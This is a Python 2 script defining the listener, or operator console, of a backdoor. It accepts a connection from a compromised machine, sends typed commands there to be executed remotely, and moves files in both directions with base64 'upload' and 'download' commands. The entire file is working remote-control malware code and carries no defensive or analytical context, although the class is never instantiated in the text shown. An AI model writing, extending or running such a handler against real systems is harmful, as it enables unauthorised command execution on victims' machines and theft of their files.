#! /usr/bin/env python


import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        listenner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listenner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listenner.bind((self.ip, self.port))
        listenner.listen(0)
        print("Waitting for connection")
        self.connection, address = listenner.accept()
        print("Got a connection" + str(address))

    def reliable_send(self, data):
        jsan_data = json.dumps(data)
        self.connection.send(jsan_data)

    def reliable_receive(self):
        jsan_data = ""
        while True:
            try:
                jsan_data = jsan_data + self.connection.recv(1024)
                return json.loads(jsan_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return " Downlaod succefull"

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()


    def run(self):
        while True:
            command = raw_input(">>   ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
               result = " Error during exe"

            print(result)






